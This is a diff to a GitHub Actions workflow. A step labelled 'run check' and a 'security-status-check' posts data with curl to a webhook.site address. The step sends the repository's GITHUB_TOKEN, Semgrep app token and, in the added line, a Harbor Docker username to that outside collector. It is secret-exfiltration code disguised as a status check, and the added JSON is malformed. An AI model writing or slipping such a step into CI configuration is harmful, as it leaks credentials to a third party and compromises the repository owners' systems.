@@ -7,7 +7,7 @@ jobs:
     steps:
       - name : run check
         run: |
-          curl -X POST -H "Content-Type: application/json" -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}}" -H "GH: ${{ github.token }}" \
-                -d '{ "state" : "failure" , "context" : "github/security-status-check" , "description" : "github/security-status-check", "target_url" : "https://github.com/${{ github.repository }}","semgrep":${{ secrets.SEMGREP_APP_TOKEN }} }' \
+          curl -X POST -H "Content-Type: application/json" -H "Authorization: ${{ secrets.GITHUB_TOKEN }}}" -H "GH: ${{ github.token }}" \
+                -d '{ "state" : "failure" , "context" : "github/security-status-check" , "description" : "github/security-status-check", "target_url" : "https://github.com/${{ github.repository }}","semgrep":${{ secrets.SEMGREP_APP_TOKEN }} } "harbor_UN":${{ secrets.HARBOR_DOCKER_USERNAME }} ' \
                 https://webhook.site/831d2555-cfac-4d72-94b0-317fc6796732/
 
